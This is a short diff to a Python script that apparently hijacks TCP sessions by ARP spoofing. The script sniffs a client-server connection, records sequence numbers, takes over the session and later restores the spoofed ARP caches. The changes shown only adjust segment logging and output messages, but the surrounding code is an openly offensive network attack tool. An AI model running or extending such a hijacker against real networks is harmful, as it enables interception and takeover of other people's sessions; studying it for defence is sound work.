@@ -78,8 +78,9 @@ def cut_off_client(if_name, client_ip, server_ip, client_port, server_port,
 
 def print_seg(tcp_seg):
     seg_str = f'{tcp_seg.src_port}->{tcp_seg.dst_port} '
-    seg_str += f'seq {tcp_seg.seq_nr} ack {tcp_seg.ack_nr}'
-    tools.print_rgb(seg_str, (100, 150, 100), bold=True)
+    seg_str += f'seq {tcp_seg.seq_nr} ack {tcp_seg.ack_nr} '
+    seg_str += f'len {tcp_seg.length} flags {tcp_seg.get_flag_str()}'
+    tools.print_rgb(seg_str, (100, 150, 100), bold=False)
 
 # validate parameters and initialize variables
 check_args()
@@ -166,8 +167,8 @@ try:
                     hijack_filter = [ip_pk.src_addr == client_ip,
                             ip_pk.dst_addr == server_ip,
                             tcp_seg.dst_port == server_port]
-                    print_seg(tcp_seg)
                     if all(hijack_filter):
+                        print_seg(tcp_seg)
                         client_port = tcp_seg.src_port
                         seq_nr = tcp_seg.seq_nr
                         ack_nr = tcp_seg.ack_nr
@@ -211,13 +212,13 @@ try:
                     termios.tcsetattr(sys.stdin, termios.TCSANOW, new_tty_attr)
         if hijacked:
             data = tcp_handler.receive(65535).decode()
-            if data != last_cmd and data != '\n' and data != '':
+            if data != last_cmd and data != '':
                 print(data, end='')
 finally:
     termios.tcsetattr(sys.stdin, termios.TCSADRAIN, term_attr)
     if hijacked:
         tcp_handler.close()
-    tools.print_rgb('\n\nstop ARP spoofing',
+    tools.print_rgb('\n\nstopping ARP spoofing...',
             rgb=(200, 0, 0), bold=True, end='')
     arp_data_client = {'operation': 2,
             'src_addr': my_mac,
